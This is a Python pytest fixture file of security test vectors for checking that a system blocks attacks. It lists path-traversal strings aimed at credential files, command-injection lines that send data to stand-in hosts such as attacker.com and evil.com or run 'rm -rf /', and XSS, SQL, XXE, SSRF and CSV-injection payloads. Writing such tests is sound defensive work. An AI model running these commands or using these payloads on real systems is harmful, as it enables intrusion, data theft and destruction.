"""Security test vectors for testing attack prevention capabilities."""

import pytest
import base64
import urllib.parse
from typing import Dict, List, Any
from pathlib import Path


@pytest.fixture
def security_vectors() -> Dict[str, List[str]]:
    """Comprehensive security attack vectors for testing.
    
    Returns:
        Dict mapping attack types to lists of attack patterns
    """
    return {
        'path_traversal': get_path_traversal_vectors(),
        'command_injection': get_command_injection_vectors(),
        'file_permission_bypass': get_file_permission_vectors(),
        'resource_exhaustion': get_resource_exhaustion_vectors(),
        'unicode_attacks': get_unicode_attack_vectors(),
        'encoding_attacks': get_encoding_attack_vectors(),
        'filename_attacks': get_filename_attack_vectors(),
        'content_attacks': get_content_attack_vectors(),
    }


def get_path_traversal_vectors() -> List[str]:
    """Path traversal attack patterns."""
    return [
        # Basic path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../../etc/shadow",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        
        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/root/.ssh/id_rsa",
        "/home/user/.ssh/id_rsa",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        
        # URL encoded path traversal
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32\\config\\sam",
        
        # Double URL encoding
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # Unicode variants
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        
        # Null byte injection
        "../../../etc/passwd%00",
        "../../../etc/passwd\\x00",
        "../../../etc/passwd\x00.txt",
        
        # Mixed separators
        "..\\../..\\../..\\../etc/passwd",
        "../..\\../..\\../etc/passwd",
        
        # Current directory references
        "./../../../../etc/passwd",
        ".\\..\\..\\..\\..\\windows\\system32\\config\\sam",
        
        # Tilde expansion
        "~/../../etc/passwd",
        "~root/.ssh/id_rsa",
        "~administrator/desktop",
        
        # UNC paths (Windows)
        "\\\\localhost\\c$\\windows\\system32\\config\\sam",
        "\\\\127.0.0.1\\c$\\windows\\system32\\config\\sam",
        
        # Case variations
        "../../../ETC/PASSWD",
        "../../../etc/PASSWD",
        "..\\..\\..\\WINDOWS\\SYSTEM32\\CONFIG\\SAM",
        
        # Long path traversal
        "../" * 20 + "etc/passwd",
        "..\\" * 20 + "windows\\system32\\config\\sam",
        
        # Filter bypass attempts
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32\\config\\sam",
        "...\\/...\\/...\\/etc/passwd",
        
        # Zip slip variants
        "../../../evil.py",
        "..\\..\\..\\evil.exe",
        
        # Symlink traversal
        "../../../tmp/symlink_to_passwd",
        "..\\..\\..\\temp\\symlink_to_sam",
    ]


def get_command_injection_vectors() -> List[str]:
    """Command injection attack patterns."""
    return [
        # Basic command injection
        "ls; rm -rf /",
        "dir && del /Q /S C:\\*",
        "ls | nc attacker.com 4444",
        "ps aux > /dev/tcp/attacker.com/4444",
        
        # Semicolon separation
        "ls; whoami",
        "ls; cat /etc/passwd",
        "ls; wget http://evil.com/malware.sh",
        
        # Ampersand separation
        "ls && whoami",
        "ls && cat /etc/passwd",
        "ls && curl http://evil.com/exfiltrate -d @/etc/passwd",
        
        # Pipe separation
        "ls | whoami",
        "ls | cat /etc/passwd",
        "ls | nc attacker.com 1234",
        
        # Background execution
        "ls & whoami",
        "ls & cat /etc/passwd &",
        "ls & nc attacker.com 4444 &",
        
        # Command substitution
        "ls $(whoami)",
        "ls `whoami`",
        "ls $(cat /etc/passwd)",
        "ls `cat /etc/passwd`",
        
        # OR/AND logic
        "ls || whoami",
        "ls || cat /etc/passwd",
        "false || cat /etc/passwd",
        
        # Redirection attacks
        "ls > /tmp/output; cat /tmp/output",
        "ls >> /tmp/log; cat /tmp/log",
        "ls 2>&1 | nc attacker.com 4444",
        
        # Environment variable manipulation
        "ls; export PATH=/tmp:$PATH",
        "ls; env | grep -i pass",
        "ls; printenv | nc attacker.com 4444",
        
        # Process substitution
        "ls <(whoami)",
        "ls <(cat /etc/passwd)",
        
        # Newline injection
        "ls\nwhoami",
        "ls\ncat /etc/passwd",
        "ls\nrm -rf /",
        
        # Quoted command injection
        "ls 'whoami'",
        'ls "whoami"',
        "ls '$(whoami)'",
        'ls "$(whoami)"',
        
        # URL encoded injection
        "ls%3Bwhoami",
        "ls%26%26whoami",
        "ls%7Cwhoami",
        
        # PowerShell injection (Windows)
        "ls; powershell -c 'whoami'",
        "ls && powershell -c 'Get-Process'",
        "ls | powershell -c 'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts'",
        
        # Batch file injection (Windows)
        "ls & echo off & whoami",
        "ls && @echo off && whoami",
        
        # Time-based attacks
        "ls; sleep 10",
        "ls && ping -c 10 127.0.0.1",
        "ls | timeout 10",
        
        # Obfuscated commands
        "ls; echo 'd2hvYW1p' | base64 -d | sh",
        "ls; printf '\\x77\\x68\\x6f\\x61\\x6d\\x69' | sh",
        
        # Polyglot attacks
        "ls</script><script>alert('xss')</script>",
        "ls'; DROP TABLE users; --",
        
        # Function-based injection
        "ls; function evil() { whoami; }; evil",
        "ls; eval 'whoami'",
        
        # Here document injection
        "ls; cat <<EOF\nwhoami\nEOF",
        
        # Multiple command separators
        "ls;&&whoami",
        "ls|&whoami",
        "ls;&whoami",
        
        # Length-based bypass
        "ls; " + "A" * 1000 + "; whoami",
        
        # Null byte injection
        "ls\x00; whoami",
        "ls\\x00; whoami",
        
        # Case manipulation
        "ls; WhOaMi",
        "ls; WHOAMI",
        "ls; wHoAmI",
    ]


def get_file_permission_vectors() -> List[str]:
    """File permission bypass attack patterns."""
    return [
        # Setuid/setgid exploitation
        "/usr/bin/sudo",
        "/bin/su",
        "/usr/bin/passwd",
        "/usr/bin/mount",
        
        # Device files
        "/dev/null",
        "/dev/zero",
        "/dev/random",
        "/dev/urandom",
        "/dev/mem",
        "/dev/kmem",
        
        # Proc filesystem
        "/proc/self/mem",
        "/proc/self/maps",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cpuinfo",
        
        # System directories
        "/sys/",
        "/proc/",
        "/dev/",
        "/boot/",
        
        # Temporary directories
        "/tmp/",
        "/var/tmp/",
        "/tmp/../etc/passwd",
        
        # Log files
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        
        # Configuration files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/sudoers",
        "/etc/fstab",
        
        # SSH keys
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/home/user/.ssh/id_rsa",
        "~/.ssh/id_rsa",
        
        # Windows-specific
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        
        # Symlink attacks
        "/tmp/symlink_to_passwd",
        "/tmp/symlink_to_shadow",
        
        # Race condition files
        "/tmp/race_condition_file",
        "/var/tmp/race_condition_file",
        
        # Hidden files
        "/.hidden_file",
        "/home/user/.bash_history",
        "/home/user/.mysql_history",
        
        # Backup files
        "/etc/passwd.bak",
        "/etc/shadow.bak",
        "/etc/passwd~",
        "/etc/shadow~",
        
        # Lock files
        "/var/lock/subsys/",
        "/var/run/",
        "/tmp/.lock",
        
        # FIFO/Named pipes
        "/tmp/fifo_pipe",
        "/var/run/pipe",
        
        # Socket files
        "/tmp/socket_file",
        "/var/run/socket",
        
        # Memory mapped files
        "/tmp/mmap_file",
        "/dev/shm/shared_memory",
    ]


def get_resource_exhaustion_vectors() -> List[str]:
    """Resource exhaustion attack patterns."""
    return [
        # Large file creation
        "A" * 1024 * 1024 * 100,  # 100MB string
        "B" * 1024 * 1024 * 500,  # 500MB string
        
        # Infinite loops in filenames
        "../" * 10000,
        "..\\" * 10000,
        
        # Zip bomb patterns
        "zip_bomb_nested_" + "nested_" * 1000,
        
        # Large JSON payloads
        '{"key": "' + "value" * 100000 + '"}',
        
        # Regex DoS patterns
        "(" * 1000 + "a" + ")" * 1000,
        "a" * 1000 + "!",
        
        # Path with many components
        "/".join(["dir"] * 1000),
        "\\".join(["dir"] * 1000),
        
        # Very long filenames
        "A" * 255,  # Max filename length
        "B" * 256,  # Over max filename length
        "C" * 1000, # Way over max filename length
        
        # Unicode normalization attacks
        "é" * 1000,  # Composed characters
        "e\u0301" * 1000,  # Decomposed characters
        
        # Memory exhaustion patterns
        "\x00" * 1024 * 1024,  # Null bytes
        "\xFF" * 1024 * 1024,  # High bytes
        
        # Process exhaustion
        "fork_bomb_" + "subprocess_" * 100,
        
        # Network exhaustion
        "http://" + "a" * 1000 + ".com",
        "https://" + "b" * 1000 + ".org",
        
        # Database exhaustion
        "SELECT * FROM table WHERE column = '" + "x" * 10000 + "'",
        
        # Log exhaustion
        "log_message_" + "A" * 10000,
        
        # Buffer overflow attempts
        "buffer_overflow_" + "X" * 10000,
        
        # Stack exhaustion
        "recursive_call_" + "deep_" * 1000,
        
        # Heap exhaustion
        "heap_allocation_" + "large_" * 1000,
        
        # Thread exhaustion
        "thread_creation_" + "many_" * 1000,
        
        # File descriptor exhaustion
        "file_open_" + "many_" * 1000,
        
        # Disk space exhaustion
        "disk_fill_" + "large_file_" * 1000,
    ]


def get_unicode_attack_vectors() -> List[str]:
    """Unicode-based attack patterns."""
    return [
        # Right-to-left override
        "file\u202Etxt.exe",
        "safe\u202Exe.txt",
        
        # Zero-width characters
        "file\u200B.txt",
        "file\u200C.txt",
        "file\u200D.txt",
        "file\uFEFF.txt",
        
        # Confusable characters
        "file.txt",  # Regular
        "fіle.txt",  # Cyrillic і
        "filе.txt",  # Cyrillic е
        "file.tхt",  # Cyrillic х
        
        # Mixed scripts
        "file_тест.txt",  # Latin + Cyrillic
        "file_テスト.txt",  # Latin + Japanese
        "file_测试.txt",   # Latin + Chinese
        
        # Bidirectional text
        "file_\u05D0\u05D1\u05D2.txt",  # Hebrew
        "file_\u0627\u0628\u062A.txt",  # Arabic
        
        # Combining characters
        "file\u0300\u0301\u0302.txt",  # Multiple combining marks
        "test\u0327\u0316\u0317.txt",  # Stacked diacritics
        
        # Normalization attacks
        "café.txt",      # Precomposed
        "cafe\u0301.txt", # Decomposed
        
        # Homograph attacks
        "gооgle.com",    # Cyrillic о
        "аpple.com",     # Cyrillic а
        "microsоft.com", # Cyrillic о
        
        # Control characters
        "file\u0000.txt",  # NULL
        "file\u0001.txt",  # SOH
        "file\u0002.txt",  # STX
        "file\u0008.txt",  # Backspace
        "file\u000B.txt",  # Vertical tab
        "file\u000C.txt",  # Form feed
        "file\u007F.txt",  # DEL
        
        # Line separator attacks
        "file\u2028.txt",  # Line separator
        "file\u2029.txt",  # Paragraph separator
        
        # Overlong UTF-8 sequences
        "file\xC0\x80.txt",    # Overlong NULL
        "file\xE0\x80\x80.txt", # Overlong NULL
        
        # Surrogate pairs
        "file\uD800\uDC00.txt",  # Valid surrogate pair
        "file\uD800.txt",        # Lone high surrogate
        "file\uDC00.txt",        # Lone low surrogate
        
        # Private use characters
        "file\uE000.txt",  # Private use area
        "file\uF8FF.txt",  # Private use area
        
        # Noncharacters
        "file\uFFFE.txt",  # Noncharacter
        "file\uFFFF.txt",  # Noncharacter
        
        # Ideographic variations
        "file\u4E00.txt",  # CJK unified ideograph
        "file\u4E01.txt",  # CJK unified ideograph
        
        # Emoji variants
        "file\U0001F600.txt",  # Emoji
        "file\U0001F1FA\U0001F1F8.txt",  # Flag emoji
        
        # Variation selectors
        "file\uFE0E.txt",  # Text variation selector
        "file\uFE0F.txt",  # Emoji variation selector
        
        # Format characters
        "file\u200E.txt",  # Left-to-right mark
        "file\u200F.txt",  # Right-to-left mark
        
        # Mongolian vowel separator
        "file\u180E.txt",
        
        # Mathematical alphanumeric symbols
        "file\U0001D400.txt",  # Mathematical bold A
        "file\U0001D468.txt",  # Mathematical bold italic A
    ]


def get_encoding_attack_vectors() -> List[str]:
    """Encoding-based attack patterns."""
    return [
        # URL encoding variations
        "%2e%2e%2f",      # ../
        "%2e%2e%5c",      # ..\
        "%252e%252e%252f", # Double encoded ../
        
        # HTML entity encoding
        "&lt;&gt;&amp;&quot;",
        "&#x3c;&#x3e;&#x26;&#x22;",
        
        # Base64 encoding
        base64.b64encode(b"../../../etc/passwd").decode(),
        base64.b64encode(b"whoami").decode(),
        
        # Hex encoding
        "\\x2e\\x2e\\x2f",  # ../
        "\\x2e\\x2e\\x5c",  # ..\
        
        # Octal encoding
        "\\056\\056\\057",  # ../
        "\\056\\056\\134",  # ..\
        
        # Unicode encoding
        "\\u002e\\u002e\\u002f",  # ../
        "\\u002e\\u002e\\u005c",  # ..\
        
        # Mixed encoding
        "%2e%2e\\u002f",
        "\\x2e\\x2e%2f",
        
        # Case variations
        "%2E%2E%2F",      # ../
        "%2e%2E%2f",      # ../
        
        # Null byte encoding
        "%00",
        "\\x00",
        "\\u0000",
        
        # Newline encoding
        "%0a",
        "%0d",
        "\\n",
        "\\r",
        
        # Tab encoding
        "%09",
        "\\t",
        
        # Space encoding
        "%20",
        "+",
        "\\x20",
        
        # Quote encoding
        "%22",
        "%27",
        "\\\"",
        "\\'",
        
        # Semicolon encoding
        "%3b",
        "\\x3b",
        
        # Ampersand encoding
        "%26",
        "\\x26",
        
        # Pipe encoding
        "%7c",
        "\\x7c",
        
        # Backslash encoding
        "%5c",
        "\\x5c",
        
        # Forward slash encoding
        "%2f",
        "\\x2f",
        
        # Colon encoding
        "%3a",
        "\\x3a",
        
        # Question mark encoding
        "%3f",
        "\\x3f",
        
        # Hash encoding
        "%23",
        "\\x23",
        
        # Bracket encoding
        "%5b",  # [
        "%5d",  # ]
        "%7b",  # {
        "%7d",  # }
        
        # Parenthesis encoding
        "%28",  # (
        "%29",  # )
        
        # Less than/greater than encoding
        "%3c",  # <
        "%3e",  # >
        
        # Equals encoding
        "%3d",  # =
        
        # At sign encoding
        "%40",  # @
        
        # Dollar sign encoding
        "%24",  # $
        
        # Percent encoding
        "%25",  # %
        
        # Caret encoding
        "%5e",  # ^
        
        # Grave accent encoding
        "%60",  # `
        
        # Tilde encoding
        "%7e",  # ~
    ]


def get_filename_attack_vectors() -> List[str]:
    """Filename-based attack patterns."""
    return [
        # Reserved Windows names
        "CON",
        "PRN", 
        "AUX",
        "NUL",
        "COM1",
        "COM2",
        "COM3",
        "COM4",
        "COM5",
        "COM6",
        "COM7",
        "COM8",
        "COM9",
        "LPT1",
        "LPT2",
        "LPT3",
        "LPT4",
        "LPT5",
        "LPT6",
        "LPT7",
        "LPT8",
        "LPT9",
        
        # Reserved with extensions
        "CON.txt",
        "PRN.log",
        "AUX.dat",
        "NUL.tmp",
        
        # Spaces and dots
        "file.",
        "file..",
        "file...",
        " file",
        "file ",
        " file ",
        "  file  ",
        
        # Special characters
        "file<>:\"|?*",
        "file\\/:*?\"<>|",
        
        # Control characters in filenames
        "file\x00name",
        "file\x01name",
        "file\x1fname",
        "file\x7fname",
        
        # Very long filenames
        "a" * 255,
        "b" * 256,
        "c" * 1000,
        
        # Unicode in filenames
        "файл.txt",      # Cyrillic
        "ファイル.txt",    # Japanese
        "文件.txt",       # Chinese
        "ملف.txt",       # Arabic
        
        # Homograph attacks
        "fіle.txt",      # Cyrillic і
        "filе.txt",      # Cyrillic е
        
        # Hidden files
        ".hidden",
        "..hidden",
        "...hidden",
        
        # Backup file patterns
        "file.bak",
        "file.backup",
        "file~",
        "file.tmp",
        "file.old",
        "file.orig",
        
        # Common sensitive files
        "password.txt",
        "passwords.txt",
        "secret.txt",
        "private.key",
        "id_rsa",
        "config.ini",
        "settings.conf",
        
        # Executable extensions
        "file.exe",
        "file.bat",
        "file.cmd",
        "file.com",
        "file.scr",
        "file.pif",
        
        # Script extensions
        "file.js",
        "file.vbs",
        "file.ps1",
        "file.sh",
        "file.py",
        "file.pl",
        "file.php",
        
        # Archive extensions
        "file.zip",
        "file.rar",
        "file.7z",
        "file.tar",
        "file.gz",
        
        # Double extensions
        "file.txt.exe",
        "file.jpg.exe",
        "file.pdf.exe",
        "document.doc.exe",
        "image.png.exe",
        
        # Case variations
        "FILE.TXT",
        "File.Txt",
        "fILE.tXT",
        
        # Mixed case extensions
        "file.TXT",
        "file.Exe",
        "file.bAt",
        
        # Null bytes in filenames
        "file\x00.txt",
        "file.txt\x00",
        "file\x00.exe",
        
        # Directory traversal in filename
        "..\\file.txt",
        "../file.txt",
        "..\\..\\file.txt",
        "../../file.txt",
        
        # Alternate data streams (Windows)
        "file.txt:hidden",
        "file.txt:ads",
        "file.txt:zone.identifier",
        
        # Mac resource forks
        "._file.txt",
        ".DS_Store",
        "file.txt/rsrc",
        
        # Symlink attacks
        "symlink_file",
        "link_to_etc_passwd",
        
        # NTFS 8.3 short names
        "PROGRA~1",
        "DOCUME~1",
        "WINDOW~1",
        
        # Filesystem-specific
        "file.txt.",      # Windows trailing dot
        "file.txt ",      # Windows trailing space
        "file.txt\t",     # Windows trailing tab
    ]


def get_content_attack_vectors() -> List[str]:
    """Content-based attack patterns."""
    return [
        # Script injection
        "<script>alert('xss')</script>",
        "<script src='http://evil.com/script.js'></script>",
        "javascript:alert('xss')",
        
        # HTML injection
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        
        # SQL injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        
        # Command injection in content
        "`whoami`",
        "$(whoami)",
        "${whoami}",
        
        # Log injection
        "User logged in\n[ADMIN] Root access granted",
        "Error: File not found\r\n[SUCCESS] Authentication bypassed",
        
        # Template injection
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%=7*7%>",
        
        # XML external entity
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        
        # LDAP injection
        "*)(&(objectclass=user))",
        "*)(|(objectclass=*))",
        
        # XPath injection
        "' or 1=1 or ''='",
        "' and count(//user)=1 and ''='",
        
        # NoSQL injection
        "{'$ne': null}",
        "{'$gt': ''}",
        "{'$regex': '.*'}",
        
        # Email injection
        "test@example.com\nBcc: victim@example.com",
        "test@example.com\r\nSubject: Injected",
        
        # CSV injection
        "=cmd|'/c calc'!A0",
        "=cmd|'/c powershell IEX(wget 0r.pe/p)'!A0",
        
        # Format string attacks
        "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
        "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
        
        # Buffer overflow patterns
        "A" * 1000,
        "B" * 10000,
        "C" * 100000,
        
        # Polyglot attacks
        "<!--[if IE]><script>alert('xss')</script><![endif]-->",
        "/**/alert('xss')/**/",
        
        # Serialization attacks
        "O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}",
        
        # XXE attacks
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        
        # SSRF attacks
        "http://localhost:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        
        # Path manipulation
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32\\config\\sam",
        
        # Null byte injection
        "file.txt\x00.exe",
        "safe.txt\x00<script>alert('xss')</script>",
        
        # Memory corruption
        "\x41" * 1000,
        "\x90" * 1000,
        
        # Format string in different contexts
        "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
        
        # Race condition triggers
        "CONCURRENT_ACCESS_TRIGGER",
        "RACE_CONDITION_PAYLOAD",
        
        # Deserialization bombs
        "SERIALIZED_BOMB_PAYLOAD",
        
        # Regex DoS
        "a" * 10000 + "!",
        "(" * 1000 + "a" + ")" * 1000,
        
        # JSON bombs
        '{"a":' * 1000 + '1' + '}' * 1000,
        
        # XML bombs
        "<?xml version=\"1.0\"?>" + "<!DOCTYPE lolz [" + "<!ENTITY lol \"lol\">" * 1000 + "]>" + "<lolz>&lol;</lolz>",
        
        # Billion laughs
        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
        
        # Zip bomb content
        "ZIP_BOMB_CONTENT_PATTERN",
        
        # Decompression bombs
        "GZIP_BOMB_CONTENT",
        "BZIP2_BOMB_CONTENT",
        
        # Protocol confusion
        "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        
        # Header injection
        "Content-Type: text/html\r\nSet-Cookie: admin=true",
        "Location: http://evil.com\r\nContent-Type: text/html",
        
        # Response splitting
        "test\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('xss')</script>",
    ]


@pytest.fixture
def malicious_file_contents() -> Dict[str, bytes]:
    """Malicious file contents for testing."""
    return {
        # Zip bomb
        'zip_bomb': b'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00!\x00' + b'0' * 1000000,
        
        # Executable with suspicious content
        'fake_exe': b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00',
        
        # Script with malicious content
        'malicious_script': b'#!/bin/bash\nrm -rf /\n',
        
        # Binary with null bytes
        'null_bytes': b'Content with \x00 null \x00 bytes',
        
        # Large file pattern
        'large_file': b'A' * 1000000,
        
        # Polyglot file
        'polyglot': b'<!--[if IE]><script>alert("xss")</script><![endif]-->',
        
        # Serialized object
        'serialized': b'O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}',
        
        # XML with XXE
        'xxe_xml': b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        
        # EICAR test string
        'eicar': b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        
        # Suspicious patterns
        'suspicious': b'password=secret\napi_key=abc123\ntoken=xyz789',
    }


@pytest.fixture
def security_test_cases() -> List[Dict[str, Any]]:
    """Pre-built security test cases."""
    return [
        {
            'name': 'path_traversal_basic',
            'input': '../../../etc/passwd',
            'expected_result': 'blocked',
            'attack_type': 'path_traversal'
        },
        {
            'name': 'command_injection_basic',
            'input': 'ls; whoami',
            'expected_result': 'blocked',
            'attack_type': 'command_injection'
        },
        {
            'name': 'unicode_bypass',
            'input': 'file\u202Etxt.exe',
            'expected_result': 'blocked',
            'attack_type': 'unicode_attack'
        },
        {
            'name': 'resource_exhaustion',
            'input': 'A' * 1000000,
            'expected_result': 'blocked',
            'attack_type': 'resource_exhaustion'
        },
        {
            'name': 'encoding_bypass',
            'input': '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'expected_result': 'blocked',
            'attack_type': 'encoding_attack'
        },
    ]